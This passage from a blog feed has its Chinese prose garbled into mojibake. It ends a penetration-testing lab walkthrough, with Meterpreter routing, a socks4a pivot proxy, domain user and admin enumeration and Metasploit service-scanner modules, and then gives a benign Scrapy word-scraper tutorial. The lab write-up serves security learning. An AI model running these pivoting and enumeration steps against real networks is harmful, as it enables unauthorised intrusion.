class="hljs-comment"># æ˜¾ç¤ºè·¯ç”±</span>meterpreter &gt;<span class="hljs-built_in"> route </span>flush <span class="hljs-comment"># åˆ é™¤</span></code></pre><p>ä½¿ç”¨<code>run post/windows/gather/arp_scanner RHOSTS=192.168.21.0/24</code>ï¼ŒæŸ¥çœ‹å­˜æ´»çš„ä¸»æœº</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511193307727.png" alt="image-20210511193307727" style="zoom:67%;"><p>ç„¶åå»ºç«‹<code>socks4</code>ä»£ç†</p><pre><code class="hljs pgsql">meterpreter &gt; backgroundmsf5 exploit(multi/<span class="hljs-keyword">handler</span>) &gt; use auxiliary/<span class="hljs-keyword">server</span>/socks4amsf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvhost <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; <span class="hljs-keyword">set</span> srvport <span class="hljs-number">1080</span>msf5 auxiliary(<span class="hljs-keyword">server</span>/socks4a) &gt; run</code></pre><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511195019515.png" alt="image-20210511195019515"></p><p>è®¾ç½®å®Œä»£ç†åæ”»å‡»è€…ä¸»æœºå°±å¯ä»¥è®¿é—®å†…ç½‘äº†</p><h2 id="åŸŸä¿¡æ¯æ”¶é›†"><a href="#åŸŸä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸä¿¡æ¯æ”¶é›†"></a>åŸŸä¿¡æ¯æ”¶é›†</h2><pre><code class="hljs jboss-cli">net time <span class="hljs-string">/domain</span>        <span class="hljs-comment">#æŸ¥çœ‹æ—¶é—´æœåŠ¡å™¨</span>net user <span class="hljs-string">/domain</span>        <span class="hljs-comment">#æŸ¥çœ‹åŸŸç”¨æˆ·</span>net view <span class="hljs-string">/domain</span>        <span class="hljs-comment">#æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ</span>net group <span class="hljs-string">&quot;domain computers&quot;</span> <span class="hljs-string">/domain</span>         <span class="hljs-comment">#æŸ¥çœ‹åŸŸå†…æ‰€æœ‰çš„ä¸»æœºå</span>net group <span class="hljs-string">&quot;domain admins&quot;</span>   <span class="hljs-string">/domain</span>          <span class="hljs-comment">#æŸ¥çœ‹åŸŸç®¡ç†å‘˜</span>net group <span class="hljs-string">&quot;domain controllers&quot;</span> <span class="hljs-string">/domain</span>       <span class="hljs-comment">#æŸ¥çœ‹åŸŸæ§</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200502702.png" alt="image-20210511200502702"></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200553874.png" alt="image-20210511200553874"></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200623757.png" alt="image-20210511200623757"></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511200650884.png" alt="image-20210511200650884"></p><p>æ±‡æ€»</p><p>ä»åŸŸä¿¡æ¯æ”¶é›†å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p><ul><li><p>åŸŸï¼šgod.org</p></li><li><p>åŸŸå†…æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼šadministratorã€ligangã€liukaifeng01</p></li><li><p>åŸŸå†…æœ‰ä¸‰å°ä¸»æœºï¼šDEV1(ä¸åœ¨æ­¤ç¯å¢ƒä¸­)ã€ROOT-TVI862UBEHã€STU1</p></li><li><p>åŸŸæ§ï¼šOWA(192.168.52.138)</p></li><li><p>åŸŸç®¡ç†å‘˜ï¼šadministrator</p></li></ul><p>ç”±æ­¤å¯è§ï¼Œæˆ‘ä»¬ç°åœ¨è·å¾—çš„å³æ˜¯åŸŸç®¡ç†å‘˜æƒé™ã€‚æ­¤ç¯å¢ƒå†…è¿˜æœ‰ä¸€å°ROOT-TVI862UBEH(192.168.52.141)å’ŒåŸŸæ§OWA(192.168.52.138)ã€‚</p><h1 id="å†…ç½‘ä¸»æœºä¿¡æ¯æ”¶é›†"><a href="#å†…ç½‘ä¸»æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="å†…ç½‘ä¸»æœºä¿¡æ¯æ”¶é›†"></a>å†…ç½‘ä¸»æœºä¿¡æ¯æ”¶é›†</h1><p>è¿œç¨‹ç™»å½•æ¡Œé¢åä¼šçœ‹åˆ°ä¸€ä¸ªNmapåº”ç”¨ï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ¢æµ‹å†…ç½‘ä¸»æœº</p><p>å½“ç„¶ä¹‹å‰å·²ç»è®¾ç½®å®Œä»£ç†äº†ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨kaliä¸­çš„msfæ¢æµ‹</p><h2 id="å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹"><a href="#å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹" class="headerlink" title="å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹"></a>å†…ç½‘å­˜æ´»ä¸»æœºæ¢æµ‹</h2><p>åœ¨åŸŸç¯å¢ƒæ¸—é€ä¸­å¯ä»¥çœç•¥ï¼Œå› ä¸ºä½¿ç”¨åŸŸå‘½ä»¤å¯ä»¥ç›´æ¥æŸ¥è¯¢åŸŸä¸­æœ‰å“ªäº›ä¸»æœºã€‚åœ¨éåŸŸç¯å¢ƒä¸­æ¸—é€ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸€æ­¥ã€‚åœ¨è¿™é‡Œé¡ºå¸¦æä¸€ä¸‹è¿™ä¸ªç”¨æ³•ã€‚æ›´å¤šçš„å…³äºä½¿ç”¨MSFè¿›è¡Œå†…ç½‘æ¢æµ‹ï¼Œä¼ é€é—¨ï¼š<a href="https://blog.csdn.net/qq_36119192/article/details/92556219">åæ¸—é€é˜¶æ®µä¹‹åŸºäºMSFçš„å†…ç½‘ä¸»æœºæ¢æµ‹</a></p><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_sweep    <span class="hljs-comment">#åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span>auxiliary<span class="hljs-regexp">/scanner/</span>discovery/udp_probe    <span class="hljs-comment">#åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span>auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname         <span class="hljs-comment">#åŸºäºnetbiosåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</span></code></pre><h2 id="å†…ç½‘å­˜æ´»ä¸»æœºç«¯å£æ‰«æ"><a href="#å†…ç½‘å­˜æ´»ä¸»æœºç«¯å£æ‰«æ" class="headerlink" title="å†…ç½‘å­˜æ´»ä¸»æœºç«¯å£æ‰«æ"></a>å†…ç½‘å­˜æ´»ä¸»æœºç«¯å£æ‰«æ</h2><p><strong>ä½¿ç”¨MSFè‡ªå¸¦æ¨¡å—è¿›è¡Œç«¯å£æ¢æµ‹</strong></p><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>portscan/tcp           <span class="hljs-comment">#åŸºäºtcpè¿›è¡Œç«¯å£æ‰«æ(é»˜è®¤æ‰«æ1-10000)</span></code></pre><p><strong>ä¹Ÿå¯ä»¥ç”¨nmapæ‰«æ</strong></p><h2 id="å†…ç½‘å­˜æ´»ä¸»æœºæœåŠ¡æ¢æµ‹"><a href="#å†…ç½‘å­˜æ´»ä¸»æœºæœåŠ¡æ¢æµ‹" class="headerlink" title="å†…ç½‘å­˜æ´»ä¸»æœºæœåŠ¡æ¢æµ‹"></a>å†…ç½‘å­˜æ´»ä¸»æœºæœåŠ¡æ¢æµ‹</h2><pre><code class="hljs awk">auxiliary<span class="hljs-regexp">/scanner/</span>ftp/ftp_version            <span class="hljs-comment">#å‘ç°å†…ç½‘ftpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤21ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>ssh/ssh_version            <span class="hljs-comment">#å‘ç°å†…ç½‘sshæœåŠ¡ï¼ŒåŸºäºé»˜è®¤22ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>telnet/telnet_version      <span class="hljs-comment">#å‘ç°å†…ç½‘telnetæœåŠ¡ï¼ŒåŸºäºé»˜è®¤23ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>dns/dns_amp                <span class="hljs-comment">#å‘ç°dnsæœåŠ¡ï¼ŒåŸºäºé»˜è®¤53ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>http/http_version          <span class="hljs-comment">#å‘ç°å†…ç½‘httpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤80ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>http/title                 <span class="hljs-comment">#æ¢æµ‹å†…ç½‘httpæœåŠ¡çš„æ ‡é¢˜</span>auxiliary<span class="hljs-regexp">/scanner/</span>smb/smb_version            <span class="hljs-comment">#å‘ç°å†…ç½‘smbæœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„445ç«¯å£   </span>auxiliary<span class="hljs-regexp">/scanner/m</span>ssql/mssql_schemadump     <span class="hljs-comment">#å‘ç°å†…ç½‘SQLServeræœåŠ¡,åŸºäºé»˜è®¤çš„1433ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>oracle/oracle_hashdump     <span class="hljs-comment">#å‘ç°å†…ç½‘oracleæœåŠ¡,åŸºäºé»˜è®¤çš„1521ç«¯å£ </span>auxiliary<span class="hljs-regexp">/scanner/my</span>sql/mysql_version        <span class="hljs-comment">#å‘ç°å†…ç½‘mysqlæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3306ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>rdp/rdp_scanner            <span class="hljs-comment">#å‘ç°å†…ç½‘RDPæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3389ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>redis/redis_server         <span class="hljs-comment">#å‘ç°å†…ç½‘RedisæœåŠ¡ï¼ŒåŸºäºé»˜è®¤6379ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>db2/db2_version            <span class="hljs-comment">#æ¢æµ‹å†…ç½‘çš„db2æœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„50000ç«¯å£</span>auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname             <span class="hljs-comment">#æ¢æµ‹å†…ç½‘ä¸»æœºçš„netbiosåå­—</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€æµ‹è¯•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spiderofwords</title>
    <link href="/2021/05/02/spiderofwords/"/>
    <url>/2021/05/02/spiderofwords/</url>
    
    <content type="html"><![CDATA[<p>scripyçˆ¬è™«çˆ¬å–å•è¯(word.iciba.com)</p><h1 id="scripyçˆ¬è™«çˆ¬å–å•è¯X"><a href="#scripyçˆ¬è™«çˆ¬å–å•è¯X" class="headerlink" title="scripyçˆ¬è™«çˆ¬å–å•è¯X"></a>scripyçˆ¬è™«çˆ¬å–å•è¯X</h1><h1 id="é¦–å…ˆåˆ›å»ºä¸€ä¸ªæœ‰å…³æ•°æ®åº“æ“ä½œçš„py"><a href="#é¦–å…ˆåˆ›å»ºä¸€ä¸ªæœ‰å…³æ•°æ®åº“æ“ä½œçš„py" class="headerlink" title="é¦–å…ˆåˆ›å»ºä¸€ä¸ªæœ‰å…³æ•°æ®åº“æ“ä½œçš„py"></a>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæœ‰å…³æ•°æ®åº“æ“ä½œçš„py</h1><p><code>dbhelper.py</code></p><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<span class="hljs-keyword">from</span> scrapy.utils.project <span class="hljs-keyword">import</span> get_project_settings// MYSQL_HOSTç­‰å‚æ•°å®šä¹‰åœ¨setting.pyä¸­// ä¹Ÿå¯ä»¥ç›´æ¥å®šä¹‰åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DBHelper</span>():</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>        self.settings = get_project_settings()        self.host = self.settings[<span class="hljs-string">&#x27;MYSQL_HOST&#x27;</span>]        self.port = self.settings[<span class="hljs-string">&#x27;MYSQL_PORT&#x27;</span>]        self.user = self.settings[<span class="hljs-string">&#x27;MYSQL_USER&#x27;</span>]        self.passwd = self.settings[<span class="hljs-string">&#x27;MYSQL_PASSWD&#x27;</span>]        self.db = self.settings[<span class="hljs-string">&#x27;MYSQL_DBNAME&#x27;</span>]    // å»ºç«‹æ•°æ®åº“è¿æ¥    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connectMysql</span>(<span class="hljs-params">self</span>):</span>        conn = pymysql.connect(host=self.host,                               port=self.port,                               user=self.user,                               passwd=self.passwd,                               charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)        <span class="hljs-keyword">return</span> conn// åˆ›å»ºæ•°æ®åº“    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connectDatabase</span>(<span class="hljs-params">self</span>):</span>        conn = pymysql.connect(host=self.host,                               port=self.port,                               user=self.user,                               passwd=self.passwd,                               db=self.db,                               charset=<span class="hljs-string">&#x27;utf8&#x27;</span>)        <span class="hljs-keyword">return</span> conn        <span class="hljs-comment"># åˆ›å»ºè¦ä½¿ç”¨åˆ°çš„æ•°æ®åº“</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createDatabase</span>(<span class="hljs-params">self</span>):</span>        conn = self.connectMysql()        sql = <span class="hljs-string">&quot;create database if not exists &quot;</span> + self.db        cur = conn.cursor()        cur.execute(sql)  <span class="hljs-comment">#</span>        cur.close()        conn.close()        <span class="hljs-comment"># åˆ›å»ºæ•°æ®è¡¨</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createTable</span>(<span class="hljs-params">self, sql</span>):</span>        conn = self.connectDatabase()        cur = conn.cursor()        cur.execute(sql)        cur.close()        conn.close()        <span class="hljs-comment"># å‘æ•°æ®åº“ä¸­æ’å…¥æ•°æ®</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">insert</span>(<span class="hljs-params">self, sql, *params</span>):</span>  <span class="hljs-comment">#</span>        conn = self.connectDatabase()        cur = conn.cursor();        cur.execute(sql, params)        conn.commit()        cur.close()        conn.close()        <span class="hljs-comment"># æ•°æ®åº“æ›´æ–°æ“ä½œ</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">self, sql, *params</span>):</span>        conn = self.connectDatabase()        cur = conn.cursor()        cur.execute(sql, params)        conn.commit()        cur.close()        conn.close()    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">self, sql, *params</span>):</span>        conn = self.connectDatabase()        cur = conn.cursor()        cur.execute(sql, params)        conn.commit()        cur.close()        conn.close()<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestDBHelper</span>():</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>        self.dbHelper = DBHelper()    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testCreateDatebase</span>(<span class="hljs-params">self</span>):</span>        self.dbHelper.createDatabase()    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testCreateTable</span>(<span class="hljs-params">self</span>):</span>        sql = <span class="hljs-string">&quot;create table wordtable(id int primary key auto_increment,word varchar(50),soundmark varchar(100),url varchar(200),translation varchar(100))&quot;</span>        self.dbHelper.createTable(sql)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testInsert</span>(<span class="hljs-params">self</span>):</span>        sql = <span class="hljs-string">&quot;insert into wordtable(word,soundmark,url,translation) values(%s,%s,%s,%s)&quot;</span>        params = (<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>)        self.dbHelper.insert(sql, *params)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testUpdate</span>(<span class="hljs-params">self</span>):</span>        sql = <span class="hljs-string">&quot;update testtable set word=%s,soundmark=%s,url=%s,translation=%s where id=%s&quot;</span>        params = (<span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)        self.dbHelper.update(sql, *params)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">testDelete</span>(<span class="hljs-params">self</span>):</span>        sql = <span class="hljs-string">&quot;delete from wordtable where id=%s&quot;</span>        params = (<span class="hljs-string">&quot;1&quot;</span>)        self.dbHelper.delete(sql, *params)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    testDBHelper = TestDBHelper()    <span class="hljs-comment"># testDBHelper.testCreateDatebase()</span>    <span class="hljs-comment"># testDBHelper.testCreateTable()</span>    <span class="hljs-comment"># testDBHelper.testInsert()</span></code></pre><p>åœ¨ç¼–å†™çˆ¬è™«ä¹‹å‰å…ˆè¿è¡Œä¸€æ¬¡è¯¥ç¨‹åºï¼Œå°±å¯ä»¥åœ¨æ•°æ®åº“ä¸­çœ‹åˆ°æ–°åˆ›å»ºçš„æ•°æ®åº“</p><h2 id="çˆ¬è™«ç¼–å†™"><a href="#çˆ¬è™«ç¼–å†™" class="headerlink" title="çˆ¬è™«ç¼–å†™"></a>çˆ¬è™«ç¼–å†™</h2><h3 id="setting-py"><a href="#setting-py" class="headerlink" title="setting.py"></a>setting.py</h3><pre><code class="hljs python">BOT_NAME = <span class="hljs-string">&#x27;words&#x27;</span>SPIDER_MODULES = [<span class="hljs-string">&#x27;words.spiders&#x27;</span>]NEWSPIDER_MODULE = <span class="hljs-string">&#x27;words.spiders&#x27;</span><span class="hljs-comment">#Mysqlæ•°æ®åº“çš„é…ç½®ä¿¡æ¯</span>MYSQL_HOST = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>MYSQL_DBNAME = <span class="hljs-string">&#x27;word&#x27;</span>         <span class="hljs-comment">#æ•°æ®åº“åå­—ï¼Œè¯·ä¿®æ”¹</span>MYSQL_USER = <span class="hljs-string">&#x27;root&#x27;</span>             <span class="hljs-comment">#æ•°æ®åº“è´¦å·ï¼Œè¯·ä¿®æ”¹</span>MYSQL_PASSWD = <span class="hljs-string">&#x27;root&#x27;</span>         <span class="hljs-comment">#æ•°æ®åº“å¯†ç ï¼Œè¯·ä¿®æ”¹</span>MYSQL_PORT = <span class="hljs-number">3306</span>               <span class="hljs-comment">#æ•°æ®åº“ç«¯å£ï¼Œåœ¨dbhelperä¸­ä½¿ç”¨</span><span class="hljs-comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span><span class="hljs-comment">#USER_AGENT = &#x27;word (+http://www.yourdomain.com)&#x27;</span>USER_AGENT = <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36&#x27;</span>LOG_LEVEL = <span class="hljs-string">&quot;WARNING&quot;</span>ROBOTSTXT_OBEY = <span class="hljs-literal">True</span><span class="hljs-comment"># Configure item pipelines</span><span class="hljs-comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span>ITEM_PIPELINES = &#123;    <span class="hljs-comment"># ä¸¤ä¸ªç®¡é“çš„ä¼˜å…ˆçº§ç›¸åŒ</span>    <span class="hljs-string">&#x27;words.pipelines.WebcrawlerScrapyPipeline&#x27;</span>: <span class="hljs-number">300</span>, <span class="hljs-comment">#ä¿å­˜åˆ°mysqlæ•°æ®åº“</span>    <span class="hljs-string">&#x27;words.pipelines.JsonWithEncodingPipeline&#x27;</span>: <span class="hljs-number">300</span>, <span class="hljs-comment">#ä¿å­˜åˆ°jsonæ–‡ä»¶ä¸­</span>&#125;</code></pre><h3 id="items-py"><a href="#items-py" class="headerlink" title="items.py"></a>items.py</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WordsItem</span>(<span class="hljs-params">scrapy.Item</span>):</span>    <span class="hljs-comment"># define the fields for your item here like:</span>    <span class="hljs-comment"># name = scrapy.Field()</span>    word = scrapy.Field()    soundmark = scrapy.Field()    url = scrapy.Field()    translation = scrapy.Field()</code></pre><h3 id="web-word-py"><a href="#web-word-py" class="headerlink" title="web_word.py"></a>web_word.py</h3><p>çˆ¬è™«æ–‡ä»¶</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> urllib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> urllib.request<span class="hljs-keyword">from</span> scrapy.selector <span class="hljs-keyword">import</span> Selector<span class="hljs-keyword">from</span> scrapy.http <span class="hljs-keyword">import</span> HtmlResponse,Request<span class="hljs-keyword">from</span> words.items <span class="hljs-keyword">import</span> WordsItem<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WebWordSpider</span>(<span class="hljs-params">scrapy.Spider</span>):</span>    name = <span class="hljs-string">&#x27;web_word&#x27;</span>    allowed_domains = [<span class="hljs-string">&#x27;word.iciba.com/&#x27;</span>]    <span class="hljs-comment"># class æ˜¯å››çº§å¿…å¤‡å•è¯ï¼Œè¿™é‡Œå¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹©ä¸åŒçš„å•è¯è¡¨</span>    first_url = <span class="hljs-string">&quot;http://word.iciba.com/?action=words&amp;class=11&amp;course=&#123;&#125;&quot;</span>    start_urls = []    <span class="hljs-comment"># ç”Ÿæˆçˆ¬å–éœ€è¦çš„urlåœ°å€æ± </span>    <span class="hljs-comment"># å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹numsï¼Œæ§åˆ¶çˆ¬å–çš„å•è¯æ•°</span>    nums = <span class="hljs-number">11</span>  <span class="hljs-comment"># çˆ¬å–å‰10é¡µçš„å•è¯ï¼Œä¸€å…±200ä¸ªå•è¯</span>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,nums):        start_urls.append(first_url.<span class="hljs-built_in">format</span>(page))    print(start_urls)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span>        se = Selector(response)        <span class="hljs-comment"># å…ˆåˆ¤æ–­é¡µé¢ä¸­æ˜¯å¦å­˜åœ¨å•è¯</span>        src = se.xpath(<span class="hljs-string">&quot;//div[@class=&#x27;word_main&#x27;]/ul/li&quot;</span>)        <span class="hljs-comment"># æå–å‡ºurlä¸­çš„é¡µæ•°</span>        page = re.findall(<span class="hljs-string">r&quot;course=\d+&quot;</span>, response.url)[<span class="hljs-number">0</span>]        print(<span class="hljs-string">&quot;===&quot;</span> * <span class="hljs-number">10</span> + <span class="hljs-string">&quot;æ­£åœ¨çˆ¬å–ç¬¬&quot;</span>+page[<span class="hljs-number">7</span>:]+<span class="hljs-string">&quot;é¡µ&quot;</span>+<span class="hljs-string">&quot;===&quot;</span> * <span class="hljs-number">10</span>)        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(src) &gt; <span class="hljs-number">0</span>:            <span class="hljs-comment"># å°†å•è¯çš„ä¿¡æ¯æå–å‡ºæ¥ï¼Œwordæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå­˜æ”¾çš„æ˜¯é¡µé¢ä¸­çš„æ‰€æœ‰å•è¯</span>            word = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_w&#x27;]/span/@title&quot;</span> ).extract()  <span class="hljs-comment"># æå–èŠ‚ç‚¹ä¿¡æ¯</span>            soundmark = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_y&#x27;]/strong/text()&quot;</span> ).extract()            url = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_y&#x27;]/a/@id&quot;</span> ).extract()            translation = se.xpath(<span class="hljs-string">&quot;//li/div[@class=&#x27;word_main_list_s&#x27;]/span/@title&quot;</span> ).extract()            <span class="hljs-comment"># å› ä¸ºä¸Šä¸€æ­¥æå‡ºçš„éŸ³æ ‡å­˜åœ¨åˆ¶è¡¨ç¬¦ï¼Œè¿™é‡Œå°±ç”¨æ­£åˆ™æå–å‡ºæ­£ç¡®çš„éŸ³æ ‡</span>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(word)):                sm = re.findall(<span class="hljs-string">r&quot;\[.*?\]&quot;</span>,soundmark[i])                soundmark[i] = sm[<span class="hljs-number">0</span>]            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(word)):                file_name = <span class="hljs-string">u&quot;%s.mp3&quot;</span> % word[i]         <span class="hljs-comment"># ç”¨å•è¯ç»™mp3æ–‡ä»¶å‘½å</span>                path = os.path.join(<span class="hljs-string">&quot;D:\Sunzh\word\cet4&quot;</span>, file_name)  <span class="hljs-comment"># mp3ä¿å­˜çš„è·¯å¾„</span>                urllib.request.urlretrieve(url[i], path)    <span class="hljs-comment"># ä¸‹è½½è¯¥mp3æ–‡ä»¶</span>                item = WordsItem()                item[<span class="hljs-string">&#x27;word&#x27;</span>] = word[i]                item[<span class="hljs-string">&#x27;soundmark&#x27;</span>] = soundmark[i]                item[<span class="hljs-string">&#x27;url&#x27;</span>] = url[i]                item[<span class="hljs-string">&#x27;translation&#x27;</span>] = translation[i]                <span class="hljs-comment"># print(item)</span>                <span class="hljs-comment"># å°†itemå‘ç»™ç®¡é“å¤„ç†ï¼Œåœ¨ç®¡é“ä¸­å†™å…¥æ•°æ®åº“å’Œjosnæ–‡ä»¶</span>                <span class="hljs-keyword">yield</span> item</code></pre><p>è¿™é‡Œæ˜¯ä½¿ç”¨xpathè·å–çš„èŠ‚ç‚¹å…ƒç´ ï¼Œå¾ˆç®€å•ã€‚</p><p>å¯ä»¥åœ¨æµè§ˆå™¨ä¸­ä¸‹è½½ä¸€ä¸ªæ’ä»¶<code>XPath Helper</code>ï¼Œè¾…åŠ©å†™å‡ºxpathè·¯å¾„ï¼Œå®ƒå¯ä»¥å°†æ‰€åŒ¹é…çš„å…ƒç´ é«˜äº®æ˜¾ç¤ºï¼Œä¿è¯ç¨‹åºä¸­çš„xpathæ­£ç¡®æ€§ã€‚</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502220632784.png" alt="image-20210502220632784"></p><h3 id="pipelines-py"><a href="#pipelines-py" class="headerlink" title="pipelines.py"></a>pipelines.py</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<span class="hljs-keyword">import</span> pymysql.cursors<span class="hljs-keyword">import</span> codecs<span class="hljs-keyword">import</span> json<span class="hljs-keyword">from</span> logging <span class="hljs-keyword">import</span> log<span class="hljs-keyword">from</span> twisted.enterprise <span class="hljs-keyword">import</span> adbapi<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JsonWithEncodingPipeline</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>    <span class="hljs-string">&#x27;&#x27;&#x27;ä¿å­˜åˆ°æ–‡ä»¶ä¸­å¯¹åº”çš„class</span><span class="hljs-string">       1ã€åœ¨settings.pyæ–‡ä»¶ä¸­é…ç½®</span><span class="hljs-string">       2ã€åœ¨è‡ªå·±å®ç°çš„çˆ¬è™«ç±»ä¸­yield item,ä¼šè‡ªåŠ¨æ‰§è¡Œ</span><span class="hljs-string">    &#x27;&#x27;&#x27;</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>        self.file = codecs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;word.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <span class="hljs-comment"># ä¿å­˜ä¸ºjsonæ–‡ä»¶</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_item</span>(<span class="hljs-params">self, item, spider</span>):</span>        line = json.dumps(<span class="hljs-built_in">dict</span>(item)) + <span class="hljs-string">&quot;\n&quot;</span>  <span class="hljs-comment"># è½¬ä¸ºjsonçš„</span>        self.file.write(line)                 <span class="hljs-comment"># å†™å…¥æ–‡ä»¶ä¸­</span>        <span class="hljs-keyword">return</span> item    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">spider_closed</span>(<span class="hljs-params">self, spider</span>):</span>  <span class="hljs-comment"># çˆ¬è™«ç»“æŸæ—¶å…³é—­æ–‡ä»¶</span>        self.file.close()<span class="hljs-class"><span class="hljs-keyword">class</span> <span 